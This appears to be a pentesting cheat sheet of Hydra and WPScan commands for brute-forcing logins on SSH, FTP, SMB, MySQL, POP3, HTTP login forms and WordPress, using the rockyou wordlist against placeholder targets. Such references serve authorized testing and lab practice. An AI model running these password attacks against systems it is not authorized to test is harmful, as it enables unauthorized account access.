# BRUTEFORCE — Hydra y WPScan

## Hydra
```bash
# SSH
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p <PASS> ssh://<TARGET_IP>

# FTP
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>

# SMB
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt smb://<TARGET_IP>

# MySQL
hydra -l <USER> -P <WORDLIST> mysql://<TARGET_IP>

# POP3
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> pop3

# HTTP POST
hydra -t 64 -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/admin.php:username=admin&password=^PASS^:Incorrect username or password."
hydra -t 64 -L <USERS_LIST> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> -s <PORT> https-post-form "/session_login.cgi:username=^USER^&password=^PASS^:Login failed."
```

## WPScan
```bash
wpscan --url http://<TARGET_IP>/blog --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```
